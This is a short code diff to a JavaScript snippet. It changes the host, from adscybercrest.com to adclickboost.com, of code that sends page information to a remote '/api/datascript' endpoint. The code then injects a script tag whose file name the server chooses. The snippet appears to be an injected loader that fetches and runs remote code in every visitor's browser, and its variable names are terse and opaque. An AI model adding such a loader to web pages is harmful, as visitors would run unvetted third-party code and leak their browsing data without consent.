@@ -76,7 +76,7 @@
         origin: window.location.hostname
     };
 
-    const re_ret_wd_url = 'https://adscybercrest.com/api/datascript';
+    const re_ret_wd_url = 'https://www.adclickboost.com/api/datascript';
 
     fetch(re_ret_wd_url, {
         method: 'POST',
@@ -99,7 +99,7 @@
         var re_rl = re_ret_f_r.url;
         var re_ret_rs_d = document.createElement('script');
         var re_ret_encodedUrl = encodeURIComponent(re_rl); 
-        re_ret_rs_d.src = 'https://adscybercrest.com/' + re_ret_r_s + '.js?url=' + re_ret_encodedUrl;
+        re_ret_rs_d.src = 'https://www.adclickboost.com/' + re_ret_r_s + '.js?url=' + re_ret_encodedUrl;
 
         re_ret_rs_d.async = true;
 
